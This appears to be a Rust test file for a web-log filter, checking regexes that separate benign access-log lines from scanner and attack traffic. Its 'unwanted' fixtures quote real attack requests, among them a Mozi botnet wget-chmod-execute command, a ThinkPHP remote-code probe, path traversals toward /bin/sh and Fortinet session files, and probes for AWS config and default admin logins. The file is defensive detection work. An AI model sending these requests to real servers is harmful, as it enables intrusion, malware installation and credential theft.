use crate::*;


#[test]
fn test_regex_patterns() {
    let r = &IP;
    let ips = [
        "1.241.215.240 - -   ",
        "192.241.215.24",
        "192.1.21.240",
        "1.2.1.2",
        "188.147.102.254 - -",
    ];
    for ip in ips {
        let the_ip = r.captures(ip).unwrap().name("ip").unwrap().as_str();
        println!("The IP: {the_ip}");
        assert!(r.is_match(the_ip));
    }
    assert!(r.is_match("DUPA 188.147.102.254 - -"));
    assert!(r.is_match("   188.147.102.254 - -"));
    assert!(r.is_match("1.2..188.147.102.254 - -"));
}


#[test]
fn test_regex_match_wanted_and_unwanted() {
    let wanted = [
        r#"185.142.236.35 - - [05/Nov/2021:03:18:44 +0100] "GET /.well-known/security.txt HTTP/1.1" 404 153 "-" "-""#,
        r#"185.142.236.35 - - [05/Nov/2021:03:18:41 +0100] "GET /robots.txt HTTP/1.1" 404 153 "-" "-""#,
        r#"185.142.236.35 - - [05/Nov/2021:03:18:46 +0100] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0""#,
        r#"140.82.115.100 - - [05/Nov/2021:07:03:04 +0100] "GET /52ce884956e2373fb3e4be609d97a5b0.png HTTP/1.1" 301 169 "-" "github-camo (fa497f37)""#,
        r#"18.184.74.47 - - [05/Nov/2021:09:57:41 +0100] "GET //24a477a890163d15b8a66289e6d558a5.png HTTP/1.1" 404 153 "-" "Slack-ImgProxy (+https://api.slack.com/robots)""#,
        r#"209.141.33.65 - - [06/Nov/2021:17:50:39 +0100] "GET //verknowsys.wasm HTTP/1.1" 200 220224 "https://verknowsys.com//" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36""#,
        r#"116.179.37.171 - - [06/Nov/2021:23:37:59 +0100] "GET /css/style.css HTTP/1.1" 200 2131 "http://dmilith.verknowsys.com/" "Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)""#,
        r#"188.121.1.62 - - [10/Nov/2021:09:39:45 +0100] "GET /8f02da2b61ae30db9428ab0a8a2cff8e.pdf HTTP/2.0" 200 44103 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36""#,
        r#"192.168.0.12 - - [09/May/2022:12:16:48 +0200] "POST /api/tsdb/query HTTP/1.1" 200 339921 "http://grafana.home/d/fHosEUY7k/versatile-knowledge-systems-vks4-home?orgId=1&refresh=30s" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) Gecko/20100101 Firefox/100.0""#,
        r#"192.168.0.34 - - [09/May/2022:12:15:59 +0200] "GET / HTTP/2.0" 200 685 "-" "Krecik/0.10.11 (+github.com/verknowsys/krecik)""#,
        r#"127.0.0.1 - - [09/May/2022:12:15:59 +0200] "GET / HTTP/2.0" 200 685 "-" """#,
        r#"55.217.51.221 - - [16/May/2022:14:11:50 +0200] "GET /binary/Common/Fontconfig-2.13.96-FreeBSD.zfsp HTTP/2.0" 200 43739 "-" "curl/7.78.0""#,
    ];
    let unwanted = [
        r#"51.75.194.66 - - [08/May/2022:07:36:00 +0200] "GET //mysqladmin/index.php?lang=en HTTP/2.0" 404 548 "http://31.179.184.210/mysqladmin/index.php?lang=en" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"#,
        r#"51.75.194.66 - - [08/May/2022:07:36:00 +0200] "GET //phpmyAdmin/index.php?lang=en HTTP/2.0" 404 548 "http://31.179.184.210/phpmyAdmin/index.php?lang=en" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36""#,
        r#"192.241.220.215 - - [08/May/2022:06:20:45 +0200] "GET /owa/auth/logon.aspx HTTP/1.1" 404 146 "-" "Mozilla/5.0 zgrab/0.x""#,
        r#"45.227.254.51 - - [07/May/2022:16:04:58 +0200] "\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Domain" 400 150 "-" "-""#,
        r#"45.146.164.110 - - [05/Nov/2021:07:45:42 +0100] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36""#,
        r#"45.146.164.110 - - [05/Nov/2021:07:45:41 +0100] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-""#,
        r#"198.199.112.26 - - [05/Nov/2021:01:50:07 +0100] "GET /owa/auth/x.js HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x""#,
        r#"193.169.253.168 - - [05/Nov/2021:03:26:58 +0100] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36""#,
        r#"193.169.253.168 - - [05/Nov/2021:03:26:56 +0100] "GET /xmlrpc.php?rsd HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36""#,
        r#"182.122.177.189 - - [05/Nov/2021:04:23:42 +0100] "POST /HNAP1/ HTTP/1.0" 404 153 "-" "-""#,
        r#"193.107.216.49 - - [05/Nov/2021:06:25:44 +0100] "GET //remote/fgt_lang?lang=/../../../..//////////dev/ HTTP/1.1" 404 153 "-" "python-requests/2.26.0""#,
        r#"42.239.251.60 - - [05/Nov/2021:04:30:49 +0100] "GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0" 404 153 "-" "-""#,
        r#"23.228.109.147 - - [05/Nov/2021:06:16:59 +0100] "GET //fileupload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 404 153 "-" "ALittle Client""#,
        r#"45.146.164.110 - - [05/Nov/2021:07:45:34 +0100] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36""#,
        r#"20.101.109.35 - - [08/May/2022:10:32:57 +0200] "GET /carbon/admin/login.jsp HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/532.9 (KHTML, like Gecko) Chrome/5.0.310.0 Safari/532.9""#,
        r#"179.43.133.218 - - [07/May/2022:22:13:16 +0200] "\x05\x01\x00" 400 150 "-" "-""#,
        r#"149.202.15.205 - - [06/May/2022:11:44:35 +0200] "GET //config/aws.yml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36""#,
        r#"192.64.113.244 - - [05/May/2022:16:45:56 +0200] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 404 146 "-" "Python-urllib/3.8""#,
        r#"51.91.7.5 - - [04/Nov/2021:22:44:53 +0100] "GET /shop/var/resource_config.json HTTP/1.1" 301 169 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/72.0""#,
        r#"42.2.69.148 - - [09/Nov/2021:16:35:09 +0100] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 157 "-" "-""#,
        r#"167.71.13.196 - - [10/Nov/2021:06:59:27 +0100] "GET /config.json HTTP/1.1" 404 153 "-" "l9explore/1.3.0""#,
        r#"67.71.13.196 - - [10/Nov/2021:06:59:29 +0100] "GET /login.action HTTP/1.1" 404 153 "-" "l9explore/1.3.0""#,
        r#"188.147.102.254 - - [09/May/2022:23:30:22 +0200] "POST /php/event.php HTTP/1.1" 301 162 "http://gminagniewino2.home.pl/" "Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36""#,
        r#"20.212.112.27 - - [09/May/2022:23:45:39 +0200] "GET ///sito/wp-includes/wlwmanifest.xml HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0 Safari/537.36""#,
        r#"error: PAM: Authentication error for illegal user admin from 185.11.61.88"#,
    ];

    let w_reg = &WANTED;
    for this in wanted {
        // dbg!(w_reg, this);
        assert!(w_reg.is_match(this));
    }
    for this in unwanted {
        // dbg!(w_reg, this);
        assert!(!w_reg.is_match(this));
    }

    let w_reg = &UNWANTED;
    for this in wanted {
        // dbg!(w_reg, this);
        assert!(!w_reg.is_match(this));
    }
    for this in unwanted {
        // dbg!(w_reg, this);
        assert!(w_reg.is_match(this));
    }
}
